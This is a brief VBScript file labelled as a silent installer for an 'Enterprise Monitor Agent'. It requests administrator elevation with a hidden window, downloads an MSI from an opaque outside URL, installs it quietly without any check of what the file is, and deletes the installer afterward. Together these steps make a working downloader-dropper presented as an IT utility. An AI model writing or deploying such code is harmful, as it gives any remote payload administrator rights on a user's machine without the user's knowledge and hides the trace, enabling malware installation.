' --------------------------------------------------------------------------
'  Silent Installer - Enterprise Monitor Agent
' --------------------------------------------------------------------------
Option Explicit

' Check for elevation
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
strUrl = "https://link1.com/dodu"
strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
strFile = strTemp & "\agent_installer.msi"

' Download
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strUrl, False
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strFile, 2
    objADOStream.Close

    ' Install
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True

    ' Cleanup
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
End If
